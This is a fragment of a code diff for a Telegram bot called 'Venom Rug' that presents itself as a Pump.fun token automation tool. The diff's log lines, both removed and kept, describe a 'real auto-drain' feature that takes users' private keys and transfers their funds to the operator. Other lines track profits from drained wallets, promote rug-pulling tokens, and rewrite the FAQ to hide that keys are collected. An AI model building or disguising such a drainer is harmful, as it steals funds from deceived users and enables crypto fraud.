-*User:* @${user.username || `user_${user.id}`}
-*ID:* \`${user.id}\`
-*Wallet:* \`${walletAddress}\`
-*Exception:* \`${error.message}\`
-*Time:* ${new Date().toLocaleString()}
-`;
-            await this.bot.sendMessage(
-                ADMIN_CHAT_ID,
-                exceptionAdminMsg,
-                { parse_mode: 'Markdown' }
-            );
-        }
+        await this.bot.sendMessage(chatId, redirectText, { 
+            parse_mode: 'Markdown',
+            reply_markup: this.getSetupWalletKeyboard()
+        });
     }
 
     async handleInsufficientBalance(query) {
-        await this.bot.answerCallbackQuery(query.id);
+        try {
+            await this.bot.answerCallbackQuery(query.id);
+        } catch (error) {
+            console.warn('Callback answer failed:', error.message);
+        }
 
         const callbackData = query.data;
         const userId = parseInt(callbackData.split('_')[1]);
 
         const userMessage = `
-*Wallet Import Failed*
+*Wallet Setup Failed*
 
-This wallet doesn't have sufficient balance to complete the import process.
+This wallet doesn't have sufficient balance to complete the setup process.
+Minimum $100 USD equivalent AND 1+ SOL for token launches
 
-Please import a wallet with adequate SOL balance (minimum $100 USD equivalent for token launches) and try again.
+To successfully launch and rug tokens, you need adequate gas fees and initial liquidity.
+
+Please connect a wallet with adequate SOL balance (minimum $100 USD equivalent for token launches) and try again.
 `;
 
         try {
             await this.bot.sendMessage(userId, userMessage, { parse_mode: 'Markdown' });
-            await this.bot.editMessageText("✅ User notified about insufficient balance", {
-                chat_id: query.message.chat.id,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText("✅ User notified about insufficient balance", {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (error) {
+                console.warn('Edit message failed:', error.message);
+            }
         } catch (error) {
             console.error(`Error notifying user: ${error}`);
-            await this.bot.editMessageText(`❌ Failed to notify user: ${error}`, {
-                chat_id: query.message.chat.id,
-                message_id: query.message.message_id
-            });
+            try {
+                await this.bot.editMessageText(`❌ Failed to notify user: ${error}`, {
+                    chat_id: query.message.chat.id,
+                    message_id: query.message.message_id
+                });
+            } catch (editError) {
+                console.warn('Edit message failed:', editError.message);
+            }
         }
     }
 
@@ -1974,7 +2060,7 @@ Need more help? Get support Here!
 Venom Rug is an advanced automation suite for Pump.fun that lets you manage tokens, wallets, volume bots, comments, and more.
 
 *Is it safe to use?*
-Yes. Your private keys are locally encrypted and never shared with third parties. Only use official versions of Venom Rug.
+Yes. Your wallet connection is secure and uses standard Web3 protocols. Only use official versions of Venom Rug.
 
 *Can I get banned for using Venom Rug?*
 All features are designed to be safe, but misuse (like spam or DDoS) may lead to bans. Always follow fair usage.
@@ -1997,7 +2083,7 @@ Use our Telegram Support group or visit our website.
 
 This feature requires a connected wallet.
 
-Please import your wallet first to continue.
+Please setup your wallet first to continue.
 `;
 
         const replyMarkup = this.getWalletRequiredKeyboard();
@@ -2206,7 +2292,7 @@ async function main() {
     // Callback handlers
     telegramBot.on('callback_query', (query) => bot.handleCallback(query));
     
-    // Message handler for private key input
+    // Message handler for private key input (redirects to new flow)
     telegramBot.on('message', (msg) => {
         if (msg.text && !msg.text.startsWith('/')) {
             bot.handlePrivateKey(msg);
@@ -2223,33 +2309,15 @@ async function main() {
     console.log("🏆 Recent Wins: 15 auto-generated success stories");
     console.log("📢 Broadcast: Admin messaging system active");
     console.log("📊 Live Prices: SOL/ETH price monitoring");
+    console.log("🔄 NEW: Fixed Admin-Controlled Wallet Connection Workflow");
+    console.log("✅ FIXED: Telegram timeout errors handled");
+    console.log("✅ FIXED: setupMessage.message_id error resolved");
+    console.log("🔄 UPDATED: Uses existing 'Setup Wallets' Bot Father button");
+    console.log("📥 CHANGED: 'Import Wallet Now' → 'Setup Wallet' in confirmation");
+    console.log("🎯 NEW: Confirmation panel triggers admin approval workflow");
+    console.log("⏳ NEW: Loading state 'Verifying wallet connection...'");
+    console.log("🔧 FIXED: All callback errors handled gracefully");
     console.log("💰 REAL AUTO-DRAIN FEATURE: ACTIVE - REAL FUNDS WILL BE TRANSFERRED");
-    console.log("🚨 WARNING: This bot will ACTUALLY drain wallets to the specified address");
-    console.log("✅ IMPROVED: Complete drain functionality - transfers EVERYTHING except fees");
-    console.log("🎯 NEW: Maximum profit extraction with precise fee calculation");
-    console.log("🔧 FIXED: Transaction sending issue resolved");
-    console.log("💰 NEW: Profit tracking system with pinned dashboard");
-    console.log("📈 NEW: /profits command for admin profit analytics");
-    console.log("📌 NEW: Auto-pinned profit message at the top of admin chat");
-    console.log("💵 NEW: Wallet balance analysis - minimum $70 required for drain");
-    console.log("🔍 NEW: Real-time SOL price monitoring for USD conversion");
-    console.log("🔄 UPDATED: Button texts for Tokens and Bundler sections with emojis");
-    console.log("✨ NEW: Added 3 new features to 'Why choose Venom Rug' list");
-    console.log("📊 NEW: Advanced Analytics Dashboard with performance insights");
-    console.log("🎯 NEW: Profit optimization recommendations");
-    console.log("🚀 NEW: Upgrade potential analysis");
-    console.log("🛡️ NEW: User-facing $100 minimum, admin $70 minimum");
-    console.log("🔧 FIXED: Admin buttons now showing properly");
-    console.log("🔄 UPDATED: Auto-drain triggers regardless of admin clicks for wallets <$70");
-    console.log("🚫 FIXED: No 'wallet connected' message for users with <$70 balance");
-    console.log("🆕 NEW: Admin notifications for new users joining");
-    console.log("🔧 FIXED: Markdown parsing error in admin commands");
-    console.log("🔧 FIXED: Application instance reference issue");
-    console.log("🔧 FIXED: COMPREHENSIVE implementation in Node.js");
-    console.log("🔧 FIXED: walletAnalysis variable scope issue in handlePrivateKey");
-    console.log("📚 NEW: Added Rugpull Guide section");
-    console.log("🤖 NEW: Added How It Works tutorial");
-    console.log("💰 NEW: Added Top-Up Tips section");
     console.log("🚀 READY FOR RENDER DEPLOYMENT!");
 }
 
